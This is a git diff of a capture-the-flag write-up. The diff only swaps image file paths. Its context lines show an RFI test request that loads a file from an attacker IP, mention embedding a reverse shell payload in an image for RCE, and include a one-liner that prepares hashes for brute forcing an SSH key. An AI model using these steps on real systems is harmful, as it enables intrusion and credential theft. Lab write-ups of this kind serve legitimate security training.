@@ -290,7 +290,7 @@ The above exploit uses an RFI to load some PHP objects for RCE. We can test this
 {"path":"http://10.10.14.64/hiiamrfi","effect":"wave"}
 ```
 
-<figure><img src="../../.gitbook/assets/image (11) (1) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 Since this was vulnerable to RFI, there's a high chance that it is vulnerable to the exploit above. We can follow the PoC to make it work. Firstly, we need to create a reverse shell payload within an image.&#x20;
 
@@ -650,7 +650,7 @@ We can then transfer this to our machine via hosting the `output.txt` file on a 
 $ cat sshkey.txt | awk '{print "\"" $5 "\"\,"}' > hashes.py
 ```
 
-<figure><img src="../../.gitbook/assets/image (17) (5) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (17) (5).png" alt=""><figcaption></figcaption></figure>
 
 Just put this within a list like `hashes = [ <all the hashes> ]`. Afterwards, `sshkey.py` can be used to brute force the SSH key:
 
